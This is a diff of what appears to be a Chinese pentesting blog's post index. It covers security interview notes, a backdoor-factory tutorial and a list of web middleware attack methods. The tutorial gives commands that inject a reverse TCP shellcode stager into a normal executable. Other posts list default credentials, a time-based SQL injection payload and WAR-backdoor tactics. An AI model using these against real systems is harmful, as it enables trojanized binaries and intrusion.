-<h3 id="DDOS有哪些-CC攻击是什么-区别是什么-在哪一个层面-什么协议"><a href="#DDOS有哪些-CC攻击是什么-区别是什么-在哪一个层面-什么协议" class="headerlink" title="DDOS有哪些,CC攻击是什么,区别是什么,在哪一个层面,什么协议"></a>DDOS有哪些,CC攻击是什么,区别是什么,在哪一个层面,什么协议</h3><p>SYN攻击 防火墙、特征匹配<br>ACK FLOOD<br>UDP FLOOD<br>ICMP FLOOD<br>CC http的get请求<br>陆地攻击 源IP和目的IP都为同一个<br>UDP DNS QUERY 向被攻击的服务器发送大量的域名解析请求，通常请求解析的域名是随机生成或者是网络世界上根本不存在的域名，被攻击的DNS 服务器在接收到域名解析请求的时候首先会在服务器上查找是否有对应的缓存，如果查找不到并且该域名无法直接由服务器解析的时候，DNS 服务器会向其上层DNS服务器递归查询域名信息</p>
-<h3 id="陆地land攻击是什么"><a href="#陆地land攻击是什么" class="headerlink" title="陆地land攻击是什么"></a>陆地land攻击是什么</h3><h3 id="xss有什么？执行存储型的xss的危害和原理"><a href="#xss有什么？执行存储型的xss的危害和原理" class="headerlink" title="xss有什么？执行存储型的xss的危害和原理"></a>xss有什么？执行存储型的xss的危害和原理</h3><h3 id="渗透测试流程？（不够清晰，太浅显"><a href="#渗透测试流程？（不够清晰，太浅显" class="headerlink" title="渗透测试流程？（不够清晰，太浅显"></a>渗透测试流程？（不够清晰，太浅显</h3><h3 id="有没有移动端的调试经验-apk-ipa包分析"><a href="#有没有移动端的调试经验-apk-ipa包分析" class="headerlink" title="有没有移动端的调试经验 apk,ipa包分析"></a>有没有移动端的调试经验 apk,ipa包分析</h3><h3 id="对于云安全的理解"><a href="#对于云安全的理解" class="headerlink" title="对于云安全的理解"></a>对于云安全的理解</h3><p>权限管理，内网威胁，信息泄露，过于依赖托管厂商</p>
-<h3 id="虚拟机逃逸的理解"><a href="#虚拟机逃逸的理解" class="headerlink" title="虚拟机逃逸的理解"></a>虚拟机逃逸的理解</h3><p>虚拟机之间通信或上层主机的通信</p>
-<h3 id="英语介绍一下自己"><a href="#英语介绍一下自己" class="headerlink" title="英语介绍一下自己"></a>英语介绍一下自己</h3><h3 id="职业路径"><a href="#职业路径" class="headerlink" title="职业路径"></a>职业路径</h3><h3 id="大学做过什么相关的事情"><a href="#大学做过什么相关的事情" class="headerlink" title="大学做过什么相关的事情"></a>大学做过什么相关的事情</h3><h3 id="在工作会做什么来不断提高自己的能力"><a href="#在工作会做什么来不断提高自己的能力" class="headerlink" title="在工作会做什么来不断提高自己的能力"></a>在工作会做什么来不断提高自己的能力</h3><h2 id="卓望"><a href="#卓望" class="headerlink" title="卓望"></a>卓望</h2><h3 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h3><h3 id="描述渗透项目，做了什么"><a href="#描述渗透项目，做了什么" class="headerlink" title="描述渗透项目，做了什么"></a>描述渗透项目，做了什么</h3><h3 id="xss漏洞类型、详情、修复方案"><a href="#xss漏洞类型、详情、修复方案" class="headerlink" title="xss漏洞类型、详情、修复方案"></a>xss漏洞类型、详情、修复方案</h3><h3 id="SQL注入原理、类型，waf绕过，写shell，提权，修复方案"><a href="#SQL注入原理、类型，waf绕过，写shell，提权，修复方案" class="headerlink" title="SQL注入原理、类型，waf绕过，写shell，提权，修复方案"></a>SQL注入原理、类型，waf绕过，写shell，提权，修复方案</h3><h3 id="终端的渗透经验"><a href="#终端的渗透经验" class="headerlink" title="终端的渗透经验"></a>终端的渗透经验</h3><h3 id="了解什么比较新的漏洞"><a href="#了解什么比较新的漏洞" class="headerlink" title="了解什么比较新的漏洞"></a>了解什么比较新的漏洞</h3><h3 id="企业内部安全"><a href="#企业内部安全" class="headerlink" title="企业内部安全"></a>企业内部安全</h3><p>信息安全管理的本质就是输入和输出。一般防范的风险为物理威胁和网络威胁。<br>防范风险可以从制度和流程（人员入离职流程、权限申请流程）、人员配备和知识积累、风险防范（物理威胁：门禁、监控、禁止USB设备接入、封闭PC、定时巡检；网络威胁：部署行为管控设备、可靠的网络结构、IP和MAC地址绑定，将网络行为分组、限制不必要的软件和通信协议、定期审核日志）</p>
-<h2 id="安巽"><a href="#安巽" class="headerlink" title="安巽"></a>安巽</h2><h3 id="算法？了解过什么排序？"><a href="#算法？了解过什么排序？" class="headerlink" title="算法？了解过什么排序？"></a>算法？了解过什么排序？</h3><p>快速排序 冒泡排序</p>
-<h3 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h3><h4 id="页面存在很多js的时候，用什么"><a href="#页面存在很多js的时候，用什么" class="headerlink" title="页面存在很多js的时候，用什么"></a>页面存在很多js的时候，用什么</h4><p>phnatomJS selenium execjs</p>
-<h4 id="爬虫的待爬取URL量级比较大的时候，如何对其去重"><a href="#爬虫的待爬取URL量级比较大的时候，如何对其去重" class="headerlink" title="爬虫的待爬取URL量级比较大的时候，如何对其去重"></a>爬虫的待爬取URL量级比较大的时候，如何对其去重</h4><ul>
-<li>在数据库中创建字段的UNIQUE属性：对于在数据库中创建字段的UNIQUE属性， 的确是可以避免一些重复性操作。不过在多次MySQL报错之后，程序可能会直接崩溃，因此这种方式不可取</li>
-<li>在数据库中创建一个唯一的索引，在插入数据之前检查待插入的数据是否存在：如果我们要在每一次插入数据之前都去检查待插入的数据是否存在，这样势必会影响程序的效率</li>
-<li>使用Set或HashSet保存数据，确保唯一。可以使用redis，但是内存占用大</li>
-<li>使用Map或是一个定长数组记录某一个URL是否被访问过</li>
-<li>布隆过滤器(bloom filter)，bitmap</li>
-</ul>
-<h4 id="多线程-异步-协程-多路复用-用哪一个最快-为什么"><a href="#多线程-异步-协程-多路复用-用哪一个最快-为什么" class="headerlink" title="多线程 异步 协程 多路复用 用哪一个最快 为什么"></a>多线程 异步 协程 多路复用 用哪一个最快 为什么</h4><blockquote>
-<p><a href="https://www.cnblogs.com/yuanchenqi/articles/6755717.html#_label3" target="_blank" rel="noopener">https://www.cnblogs.com/yuanchenqi/articles/6755717.html#_label3</a></p>
-</blockquote>
-<p>线程也叫轻量级进程，它是一个基本的CPU执行单元，也是程序执行过程中的最小单元，由线程ID、程序计数器、寄存器集合和堆栈共同组成。线程的引入减小了程序并发执行时的开销，提高了操作系统的并发性能。线程没有自己的系统资源。</p>
-<p>异步是指进程不需要一直等下去，而是继续执行下面的操作，不管其他进程的状态。当有消息返回时系统会通知进程进行处理，这样可以提高执行的效率。</p>
-<p>协程是一种用户态的轻量级线程，拥有自己的寄存器上下文和栈</p>
-<p>IO多路复用 异步阻塞IO 线程轮询IO</p>
-<h3 id="浏览器的常用编码"><a href="#浏览器的常用编码" class="headerlink" title="浏览器的常用编码"></a>浏览器的常用编码</h3><p>一开始我以为是说字符编码，有UTF8 Unicode GBK。面试官还几番提醒我也没答上来。回来一想，我觉得他应该问的是content-type。 <a href="http://www.runoob.com/http/http-content-type.html" target="_blank" rel="noopener">http://www.runoob.com/http/http-content-type.html</a> </p>
-<h3 id="web常用的加密算法有什么"><a href="#web常用的加密算法有什么" class="headerlink" title="web常用的加密算法有什么"></a>web常用的加密算法有什么</h3><p>非对称加密  RSA、ElGamal、Rabin<br>对称加密 DES、3DES、AES<br>散列算法 MD5 SHA base64</p>
-<h3 id="有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？"><a href="#有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？" class="headerlink" title="有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？"></a>有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？</h3><p>拿下机器后<br>内网渗透使用代理访问内网 windows环境：reGeorg与proxifier Linux（kali-linux）环境：reGeorg与proxychains，使用nmap等工具进行扫描，发现web服务的主机和其它信息。有时这些边界机器上会记录一些内网服务器上的一些信息（用户 ssh known_hosts  hosts 防火墙设置 记录、内网之间好多waf 规则基本都是空，大多数waf防外部威胁  这时候可以拿到探测的内部一些开放的端口判断进行渗透，通常用户这里基本是统一命名的   拿到的各种记录 会暴露出部分内网通讯的ip</p>
-<p>内网内弱口令占大多数 FTP MSSQL 远程桌面链接</p>
-<h3 id="mysql中like查询会会非常缓慢，如何进行优化"><a href="#mysql中like查询会会非常缓慢，如何进行优化" class="headerlink" title="mysql中like查询会会非常缓慢，如何进行优化"></a>mysql中like查询会会非常缓慢，如何进行优化</h3><p>分词索引</p>
-<h3 id="做了cdn的网站如何获取真实IP"><a href="#做了cdn的网站如何获取真实IP" class="headerlink" title="做了cdn的网站如何获取真实IP"></a>做了cdn的网站如何获取真实IP</h3><ol>
-<li>多地ping看是否有cdn</li>
-<li>邮件订阅或者rss订阅</li>
-<li>二级域名可能不会做cdn</li>
-<li>nslookup <a href="http://xxx.com" target="_blank" rel="noopener">http://xxx.com</a> 国外dns</li>
-<li>查找域名历史解析记录，因为域名在上CDN之前用的IP，很有可能就是CDN的真实源IP地址 <a href="https://toolbar.netcraft.com/site_report?url=www.xxx.com" target="_blank" rel="noopener">https://toolbar.netcraft.com/site_report?url=www.xxx.com</a></li>
-<li>phpinfo上显示的信息</li>
-</ol>
-<h3 id="渗透的时候如何隐藏自己的身份"><a href="#渗透的时候如何隐藏自己的身份" class="headerlink" title="渗透的时候如何隐藏自己的身份"></a>渗透的时候如何隐藏自己的身份</h3><h3 id="主机疑似遭到入侵，要看哪里的日志"><a href="#主机疑似遭到入侵，要看哪里的日志" class="headerlink" title="主机疑似遭到入侵，要看哪里的日志"></a>主机疑似遭到入侵，要看哪里的日志</h3><h3 id="SQL注入漏洞怎么修复"><a href="#SQL注入漏洞怎么修复" class="headerlink" title="SQL注入漏洞怎么修复"></a>SQL注入漏洞怎么修复</h3><h2 id="长亭"><a href="#长亭" class="headerlink" title="长亭"></a>长亭</h2><h3 id="安全研究的方面？做过哪些渗透测试的工作？"><a href="#安全研究的方面？做过哪些渗透测试的工作？" class="headerlink" title="安全研究的方面？做过哪些渗透测试的工作？"></a>安全研究的方面？做过哪些渗透测试的工作？</h3><h3 id="只给你一个网址，如何进行渗透测试"><a href="#只给你一个网址，如何进行渗透测试" class="headerlink" title="只给你一个网址，如何进行渗透测试"></a>只给你一个网址，如何进行渗透测试</h3><h3 id="SQL注入，id-1如何检测？orderby怎么利用？limit语句怎么利用？盲注有什么？"><a href="#SQL注入，id-1如何检测？orderby怎么利用？limit语句怎么利用？盲注有什么？" class="headerlink" title="SQL注入，id=1如何检测？orderby怎么利用？limit语句怎么利用？盲注有什么？"></a>SQL注入，id=1如何检测？orderby怎么利用？limit语句怎么利用？盲注有什么？</h3><h3 id="sleep被禁用后还能怎么进行sql注入"><a href="#sleep被禁用后还能怎么进行sql注入" class="headerlink" title="sleep被禁用后还能怎么进行sql注入"></a>sleep被禁用后还能怎么进行sql注入</h3><p>BENCHMARK，Get_lock函数，当都被禁用后可以用计算量比较大的语句使数据库查询时间变长，从而达到延时注入的效果。<br>mysql：<code>AND (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C);</code></p>
-<h3 id="XSS可以控制属性怎么利用"><a href="#XSS可以控制属性怎么利用" class="headerlink" title="XSS可以控制属性怎么利用"></a>XSS可以控制属性怎么利用</h3><h3 id="CSRF怎么防护？"><a href="#CSRF怎么防护？" class="headerlink" title="CSRF怎么防护？"></a>CSRF怎么防护？</h3><p>尽量使用POST，限制GET；浏览器Cookie策略；加验证码； Referer Check；Anti CSRF Token</p>
-<h3 id="请求头中哪些是有危害的？"><a href="#请求头中哪些是有危害的？" class="headerlink" title="请求头中哪些是有危害的？"></a>请求头中哪些是有危害的？</h3><p>Cookie</p>
-<h3 id="XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过"><a href="#XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过" class="headerlink" title="XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过"></a>XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过</h3><p>xxe常见场景是如pdf在线解析、word在线解析、定制协议，留言板等，跟逻辑设计有关而与语言无关，最好是不要让XML作为参数传输或整体结构可被用户篡改。如果一定要使用，至少要禁用DTD、Entity。<br>xxe危害 读取本地文件，执行系统命令，探测内网端口，攻击内网服务<br>探测内网端口的协议有gopher file dict，不同语言支持不同的协议，是具体情况而定 file http ftp是常用的</p>
-<p>防范，python用lxml时可以对resolve_entities设为false。或者过滤用户提交的xml</p>
-<p>客户端也可以有xxe攻击，有的网站会使用office打开docx进行解析<br>Java解析XML的常用三方库，如果不禁用DTD、Entity都会导致XXE漏洞：</p>
-<p>javax.xml.stream.XMLStreamReader;</p>
-<p>javax.xml.parsers.DocumentBuilderFactory;</p>
-<h3 id="JAVA中间件的漏洞，举几个例子？"><a href="#JAVA中间件的漏洞，举几个例子？" class="headerlink" title="JAVA中间件的漏洞，举几个例子？"></a>JAVA中间件的漏洞，举几个例子？</h3><p>常见的是反序列化漏洞</p>
-<h3 id="IIS常见的漏洞"><a href="#IIS常见的漏洞" class="headerlink" title="IIS常见的漏洞"></a>IIS常见的漏洞</h3><p>常见的为解析漏洞，6.0有<br>/test.asp/test.jpg<br>  test.asp;.jpg<br>  7.5有test.jpg/.php，默认后缀IIS默认地还会解析其他后缀的文件为asp文件，比如cer asa cdx<br>  原理大抵是IIS 5.x/6.0在从文件路径中读取文件后缀时，遇到一个“.”后，便进入了一种截断状态，在该状态下遇到特殊符号——“/”和“;”，都会进行截断，只保留特殊符号前的部分，即：“.asp”，从而认为文件后缀为“.asp”。</p>
-<h3 id="python有哪些框架，其中出现过哪些漏洞"><a href="#python有哪些框架，其中出现过哪些漏洞" class="headerlink" title="python有哪些框架，其中出现过哪些漏洞"></a>python有哪些框架，其中出现过哪些漏洞</h3><p>flask的模板注入 模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。<br>模板字符串中字符串拼接或替换可能会导致敏感信息泄露，获取变量值<br>如果开发者在flask使用字符串格式化，来将用户输入动态地加入到模板字符串中，而不是通过render_template_string函数，该函数不会对输入进行实体转义将URL传递进入模板内容当中，会导致xss的产生。<br>还可以利用模板中html标签属性字段绕过xss过滤。</p>
-<p>Django出现过目录遍历漏洞</p>
-<h3 id="业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？"><a href="#业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？" class="headerlink" title="业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？"></a>业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？</h3><h3 id="PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？"><a href="#PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？" class="headerlink" title="PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？"></a>PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？</h3><h3 id="HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie"><a href="#HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie" class="headerlink" title="HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie"></a>HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie</h3><p>Http Trace攻击就可以将你的Header里的Cookie回显出来，利用Ajax或者flash就可以完成这种攻击；或者配置或者应用程序上可能Bypass，比如header头的泄漏</p>
-<h2 id="盛邦"><a href="#盛邦" class="headerlink" title="盛邦"></a>盛邦</h2><h3 id="有没有做过协议分析和抓包分析"><a href="#有没有做过协议分析和抓包分析" class="headerlink" title="有没有做过协议分析和抓包分析"></a>有没有做过协议分析和抓包分析</h3><h2 id="翼果"><a href="#翼果" class="headerlink" title="翼果"></a>翼果</h2><h3 id="mysql查看版本？"><a href="#mysql查看版本？" class="headerlink" title="mysql查看版本？"></a>mysql查看版本？</h3><h3 id="过安全狗"><a href="#过安全狗" class="headerlink" title="过安全狗"></a>过安全狗</h3><h3 id="编程能力-平台逆向-修改程序入口-rootkit有没有研究过"><a href="#编程能力-平台逆向-修改程序入口-rootkit有没有研究过" class="headerlink" title="编程能力/平台逆向/修改程序入口/rootkit有没有研究过"></a>编程能力/平台逆向/修改程序入口/rootkit有没有研究过</h3>]]></content>
-      <tags>
-        <tag>面试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>渗透测试面试问题2019版</title>
     <url>/2019/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%982019%E7%89%88/</url>
     <content><![CDATA[<blockquote>
@@ -4500,21 +4500,6 @@
       </tags>
   </entry>
   <entry>
-    <title>shellcode注入工具—backdoor-factory</title>
-    <url>/2019/09/19/shellcode%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E2%80%94backdoor-factory/</url>
-    <content><![CDATA[<p>backdoor-factory是向正常的elf、exe、dll注入shellcode。之前测试过，免杀效果还可以，但是比较依赖正常的文件</p><a id="more"></a>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backdoor.py -f /demo/xxx.exe -S   //检测是否支持后门植入</span><br><span class="line">backdoor.py -f /demo/xxx.exe -c -l 700    //显示出code cave大于700字符大小的code cave</span><br><span class="line">backdoor.py -f /demo/xxx.exe -s show  //查看可用payload</span><br><span class="line">backdoor.py -f /demo/xxx.exe -H x.x.x.x -P 8080 -s iat_reverse_tcp_stager_threaded     //插入payload，并生成文件。</span><br></pre></td></tr></table></figure>
-
-<p>生成好之后可以对比一下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">md5sum ./guobang.exe /root/demo/guobang.exe  //对比原文件与生成文件MD5值</span><br><span class="line">du -b ./guobang.exe /root/demo/guobang.exe   //对比文件大小</span><br></pre></td></tr></table></figure>
-
-<p>tips:<br>1、backdoor最好是github上下载的，不要aptget</p>
-]]></content>
-      <tags>
-        <tag>工具</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>vssadmin获取NTDS实操</title>
     <url>/2019/09/19/vssadmin%E8%8E%B7%E5%8F%96NTDS%E5%AE%9E%E6%93%8D/</url>
     <content><![CDATA[<p>把昨天发的vssadmin获取ntds数据库的文章实际操作了一下<br>这里使用的是God.org单域环境(更新1)，我的目的只是实操vssadmin所以不搞的太复杂<br><img src="https://i.loli.net/2019/11/11/gKbpe8clSqTjYZ9.png" alt="Image-1.png"></p><a id="more"></a>
@@ -4553,6 +4538,21 @@
 ]]></content>
       <tags>
         <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>shellcode注入工具—backdoor-factory</title>
+    <url>/2019/09/19/shellcode%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E2%80%94backdoor-factory/</url>
+    <content><![CDATA[<p>backdoor-factory是向正常的elf、exe、dll注入shellcode。之前测试过，免杀效果还可以，但是比较依赖正常的文件</p><a id="more"></a>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backdoor.py -f /demo/xxx.exe -S   //检测是否支持后门植入</span><br><span class="line">backdoor.py -f /demo/xxx.exe -c -l 700    //显示出code cave大于700字符大小的code cave</span><br><span class="line">backdoor.py -f /demo/xxx.exe -s show  //查看可用payload</span><br><span class="line">backdoor.py -f /demo/xxx.exe -H x.x.x.x -P 8080 -s iat_reverse_tcp_stager_threaded     //插入payload，并生成文件。</span><br></pre></td></tr></table></figure>
+
+<p>生成好之后可以对比一下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">md5sum ./guobang.exe /root/demo/guobang.exe  //对比原文件与生成文件MD5值</span><br><span class="line">du -b ./guobang.exe /root/demo/guobang.exe   //对比文件大小</span><br></pre></td></tr></table></figure>
+
+<p>tips:<br>1、backdoor最好是github上下载的，不要aptget</p>
+]]></content>
+      <tags>
+        <tag>工具</tag>
       </tags>
   </entry>
   <entry>
@@ -5274,6 +5274,47 @@
       </tags>
   </entry>
   <entry>
+    <title>（一）渗透技巧—web</title>
+    <url>/2019/04/15/%EF%BC%88%E4%B8%80%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94web/</url>
+    <content><![CDATA[<blockquote>
+<p>文章不记得从哪个公众号上拉下来的了</p>
+</blockquote><a id="more"></a>
+<h2 id="1、自定义-Web-应用"><a href="#1、自定义-Web-应用" class="headerlink" title="1、自定义 Web 应用"></a>1、自定义 Web 应用</h2><p>从公网直接攻击目标对外的 Web 应用，或者在授权的情况下在内网进行渗透测试，如果是入侵目的可以直接寻找注入、上传、代码执行、文件包含等高危漏洞，尝试获取系统权限，或者直接能拿到敏感数据。<br>允许扫描的话一般使用 WVS 直接扫描，也可以使用专门扫描特定漏洞的扫描工具如 sqlmap、XSStrike 等工具扫描特定类型的漏洞。不允许直接扫描，使用 Burp 手工慢慢找了。</p>
+<h2 id="2、Web-中间件"><a href="#2、Web-中间件" class="headerlink" title="2、Web 中间件"></a>2、Web 中间件</h2><h3 id="（1）Tomcat"><a href="#（1）Tomcat" class="headerlink" title="（1）Tomcat"></a>（1）Tomcat</h3><p>Tomcat是Apache Jakarta软件组织的一个子项目，Tomcat是一个JSP/Servlet容器，它是在SUN公司的JSWDK（Java Server Web Development Kit）基础上发展起来的一个JSP和Servlet规范的标准实现，使用Tomcat可以体验JSP和Servlet的最新规范。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口号：8080</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   默认口令、弱口令，爆破，tomcat5 默认有两个角色：tomcat和role1。其中账号both、tomcat、role1的默认密码都是tomcat。弱口令一般存在5以下的版本中。</span><br><span class="line">•   在管理后台部署 war 后门文件</span><br><span class="line">•   远程代码执行漏洞</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://paper.seebug.org/399/</span><br><span class="line">http://www.freebuf.com/column/159200.html</span><br><span class="line">http://liehu.tass.com.cn/archives/836</span><br><span class="line">http://www.mottoin.com/87173.html</span><br></pre></td></tr></table></figure>
+<h3 id="（2）Jboss"><a href="#（2）Jboss" class="headerlink" title="（2）Jboss"></a>（2）Jboss</h3><p>是一个运行EJB的J2EE应用服务器。它是开放源代码的项目，遵循最新的J2EE规范。从JBoss项目开始至今，它已经从一个EJB容器发展成为一个基于的 J2EE 的一个Web 操作系统（operating system for web），它体现了 J2EE 规范中最新的技术。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：8080</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   弱口令，爆破</span><br><span class="line">•   管理后台部署 war 后门</span><br><span class="line">•   反序列化</span><br><span class="line">•   远程代码执行</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.vuln.cn/6300</span><br><span class="line"></span><br><span class="line">http://mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html</span><br><span class="line"></span><br><span class="line">https://www.zybuluo.com/websec007/note/838374</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/u011215939/article/details/79141624</span><br></pre></td></tr></table></figure>
+<h3 id="（3）WebLogic"><a href="#（3）WebLogic" class="headerlink" title="（3）WebLogic"></a>（3）WebLogic</h3><p>WebLogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：7001，7002</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   弱口令、爆破，弱密码一般为weblogic/Oracle@123 or weblogic</span><br><span class="line">•   管理后台部署 war 后门</span><br><span class="line">•   SSRF</span><br><span class="line">•   反序列化漏洞</span><br><span class="line">•   weblogic_uac</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</span><br><span class="line"></span><br><span class="line">https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html</span><br><span class="line"></span><br><span class="line">https://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/</span><br><span class="line"></span><br><span class="line">https://bbs.pediy.com/thread-224954.htm</span><br></pre></td></tr></table></figure>
+<h3 id="4）WebSphere"><a href="#4）WebSphere" class="headerlink" title="4）WebSphere"></a>4）WebSphere</h3><p>IBM公司一套典型的电子商务应用开发工具及运行环境。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：默认端口：908*；第一个应用就是9080，第二个就是9081；控制台9090</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   控制台登录爆破</span><br><span class="line">•   很多内网 websphere 的控制台存在弱口令 / 默认口令，可以使用 admin/admin 以及 webshpere/webshpere 这种口令登录。 通过该口令登录控制台后，可以部署 war 包，从而获取到 WEBSHELL 。</span><br><span class="line">•   反序列化</span><br><span class="line">•   任意文件泄露</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=WebSphere&amp;serverity=%E9%AB%98%E5%8D%B1</span><br><span class="line"></span><br><span class="line">http://www.fr1sh.com/wooyun_1/bug_detail.php?wybug_id=wooyun-2013-036803</span><br><span class="line"></span><br><span class="line">https://gist.github.com/metall0id/bb3e9bab2b7caee90cb7</span><br></pre></td></tr></table></figure>
+<h2 id="3、Web-框架"><a href="#3、Web-框架" class="headerlink" title="3、Web 框架"></a>3、Web 框架</h2><h3 id="（1）Struts2"><a href="#（1）Struts2" class="headerlink" title="（1）Struts2"></a>（1）Struts2</h3><p>Struts2是一个优雅的,可扩展的框架,用于创建企业准备的Java Web应用程序。出现的漏洞也着实的多每爆一个各大漏洞平台上就会被刷屏。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line"></span><br><span class="line">•   S2-046 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10</span><br><span class="line">•   S2-045 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10</span><br><span class="line">•   S2-037 CVE-2016-4438 Struts 2.3.20-2.3.28.1</span><br><span class="line">•   S2-032 CVE-2016-3081 Struts 2.3.18-2.3.28</span><br><span class="line">•   S2-020 CVE-2014-0094 Struts 2.0.0-2.3.16</span><br><span class="line">•   S2-019 CVE-2013-4316 Struts 2.0.0-2.3.15.1</span><br><span class="line">•   S2-016 CVE-2013-2251 Struts 2.0.0-2.3.15</span><br><span class="line">•   S2-013 CVE-2013-1966 Struts 2.0.0-2.3.14</span><br><span class="line">•   S2-009 CVE-2011-3923 Struts 2.0.0-2.3.1.1</span><br><span class="line">•   S2-005 CVE-2010-1870 Struts 2.0.0-2.1.8.1</span><br><span class="line">参考：</span><br><span class="line">https://github.com/hktalent/myhktools</span><br><span class="line"></span><br><span class="line">https://github.com/Lucifer1993/struts-scan</span><br><span class="line"></span><br><span class="line">https://github.com/SecureSkyTechnology/study-struts2-s2-054_055-jackson-cve-2017-7525_cve-2017-15095</span><br></pre></td></tr></table></figure>
+<h3 id="（2）Spring-框架"><a href="#（2）Spring-框架" class="headerlink" title="（2）Spring 框架"></a>（2）Spring 框架</h3><p>Spring Framework 是一个开源的Java／Java EE全功能栈（full-stack）的应用程序框架，以Apache License 2.0开源许可协议的形式发布，也有.NET平台上的移植版本。Spring Framework提供了一个简易的开发方式，这种开发方式，将避免那些可能致使底层代码变得繁杂混乱的大量的属性文件和帮助类。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   CVE-2010-1622</span><br><span class="line">•   CVE-2018-1274</span><br><span class="line">•   CVE-2018-1270</span><br><span class="line">•   CVE-2018-1273</span><br><span class="line">•   反序列化</span><br><span class="line">•   目录穿越</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.inbreak.net/archives/377</span><br><span class="line"></span><br><span class="line">https://www.secpulse.com/archives/71762.html</span><br><span class="line"></span><br><span class="line">http://www.open-open.com/news/view/1225d07</span><br><span class="line"></span><br><span class="line">https://xz.aliyun.com/t/2261</span><br><span class="line"></span><br><span class="line">https://xz.aliyun.com/t/2252</span><br></pre></td></tr></table></figure>
+<h2 id="4、Web-服务器"><a href="#4、Web-服务器" class="headerlink" title="4、Web 服务器"></a>4、Web 服务器</h2><h3 id="IIS：Windows-的-WWW-服务器"><a href="#IIS：Windows-的-WWW-服务器" class="headerlink" title="IIS：Windows 的 WWW 服务器"></a>IIS：Windows 的 WWW 服务器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   https://masterxsec.github.io/2017/06/07/IIS-write-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</span><br><span class="line">•   http://www.freebuf.com/articles/4908.html</span><br><span class="line">•   https://www.anquanke.com/post/id/85811</span><br><span class="line">•   IIS，开启了 WebDAV，可以直接详服务器 PUT 文件</span><br><span class="line">•   短文件名枚举漏洞</span><br><span class="line">•   远程代码执行</span><br><span class="line">•   提权漏洞</span><br><span class="line">•   解析漏洞</span><br><span class="line">•   端口：80</span><br></pre></td></tr></table></figure>
